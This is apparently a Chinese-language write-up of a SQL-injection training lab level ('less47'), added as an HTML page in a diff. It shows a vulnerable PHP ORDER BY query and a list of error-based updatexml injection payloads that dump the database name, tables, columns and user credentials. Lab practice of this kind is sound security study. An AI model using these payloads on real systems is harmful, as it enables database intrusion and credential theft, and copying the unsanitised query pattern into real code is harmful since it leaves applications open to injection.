@@ -1,0 +1,20 @@
+<hr>
+<h2 id="title-less47url-https-www-yuque-com-u29002979-ep2zrx-kx2cvm13e1ioy8kb"><a href="#title-less47url-https-www-yuque-com-u29002979-ep2zrx-kx2cvm13e1ioy8kb" class="headerlink" title="title: less47url: https://www.yuque.com/u29002979/ep2zrx/kx2cvm13e1ioy8kb"></a>title: less47<br>url: <a href="https://www.yuque.com/u29002979/ep2zrx/kx2cvm13e1ioy8kb">https://www.yuque.com/u29002979/ep2zrx/kx2cvm13e1ioy8kb</a></h2><pre><code class="bash">$id=$_GET[&#39;sort&#39;];	
+
+$sql = &quot;SELECT * FROM users ORDER BY &#39;$id&#39;&quot;;
+</code></pre>
+<p>闭合方式为单引号’ <a name="qjWYr"></a></p>
+<h1 id="注入点检查"><a href="#注入点检查" class="headerlink" title="注入点检查"></a>注入点检查</h1><p><code>?sort=1&#39;</code></p>
+<blockquote>
+<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’’ at line 1</p>
+</blockquote>
+<p>单引号’闭合 <a name="gX6OV"></a></p>
+<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><pre><code class="bash">查询数据库表
+?sort=1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1) -- +
+爆破数据表
+?sort=1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1) -- +
+爆破字段名
+?sort=1&#39; and updatexml(1,concat(0x7e,(select  group_concat(column_name)from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;),0x7e),1) -- +
+爆破字段
+?sort=1&#39; and updatexml(1,concat(0x7e,(select group_concat(username,0x7e,password) from users limit 0,1),0x7e),1) -- +
+</code></pre>
